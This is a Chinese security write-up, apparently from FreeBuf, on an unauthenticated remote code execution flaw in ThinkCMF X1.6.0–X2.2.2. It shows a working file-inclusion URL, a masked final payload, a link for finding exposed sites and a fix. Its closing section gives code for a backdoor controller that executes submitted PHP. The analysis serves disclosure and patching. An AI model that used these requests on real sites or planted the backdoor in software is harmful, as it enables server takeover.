## 一、背景

 **ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。**

ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。

每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。

> 官网:<http://www.thinkcmf.com>

## 二、影响版本

> ThinkCMF X1.6.0
>
> ThinkCMF X2.1.0
>
> ThinkCMF X2.2.0
>
> ThinkCMF X2.2.1
>
> ThinkCMF X2.2.2

## 三、漏洞危害

远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。

## 四、漏洞挖掘

根据index.php中的配置，他的项目路径为application，打开 Portal 下的 Controller 目录，选择一个控制类文件。

![1.png](https://image.3001.net/images/20191022/15717260023425.png!small)

发现他的父类为Common\Controller\HomebaseController。

在HomeBaseController中加入如下测试代码

![1.png](https://image.3001.net/images/20191022/15717269452605.png!small)

ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。

由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。

可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。

[http://127.0.0.1/cmfx-master/?a=test_public&arg1=run%20success](http://127.0.0.1/cmfx-master/?a=test_public&arg1=run%20success)

![1.png](https://image.3001.net/images/20191022/15717262906506.png!small)

HomeBaseController类中有一些访问权限为public的函数，

![1.png](https://image.3001.net/images/20191022/15717263238531.png!small)

重点关注display函数.看描述就是可以自定义加载模版，通过$this->parseTemplate
函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。

然后调用THinkphp Controller 函数的display方法

    
    
    /**
    
         * 加载模板和页面输出 可以返回输出内容
    
         * @access public 
    
         * @param string $templateFile 模板文件名 
    
         * @param string $charset 模板输出字符集 
    
         * @param string $contentType 输出类型
    
         * @param string $content 模板输出内容 
    
         * @return mixed 
    
         */ 
    
          public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') { 
    
          parent::display($this->parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
    
          }

再往下就是调用Think View的fetch方法，这里的TMPL_ENGINE_TYPE 为Think,
最终模版内容解析在ParseTemplateBehavior中完成

如下调用即可加载任意文件

[http://127.0.0.1:81/cmfx-master/?a=display&templateFile=README.md](http://127.0.0.1:81/cmfx-master/?a=display&templateFile=README.md)

![1.png](https://image.3001.net/images/20191022/15717263812267.png!small)

要利用该方法shell,还需要配合前台的一个上传功能，通过包含自己上传的文件来shell，难免有些麻烦。

## 五、影响范围

往下面翻阅发现还有fetch方法，display方法相对fetch只是多了一个render的过程，而且这里不需要知道文件路径

最终完美payload (打码)

    
    
    http://127.0.0.1:81/cmfx-master/?a=fetch&****=********

通过在斗象智能安全资产情报搜索关键字，使用ThinkCMF的站点

<https://arl.riskivy.com/products/lighthouse?query=headers:%22X-Powered-By:%20ThinkCMF%22>

![1.png](https://image.3001.net/images/20191022/15717264109717.png!small)

## 六、修复方法

将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和
fetch 函数的修饰符改为 protected

## 七、自定义后门

可通过新建如下控制类

    
    
    namespace Portal\Controller;
    
    use Think\Controller;
    
    class DoorController extends Controller {
    
       public function index($content) {
    
          parent::display('', '', '',$content, '');
    
       }
    
     }

由于是测试，content未做任何处理，直接传输php代码即可执行。

![1.png](https://image.3001.net/images/20191022/15717265194494.png!small)

 ***本文作者：斗象能力中心 TCC – 星光，转载请注明来自FreeBuf.COM**

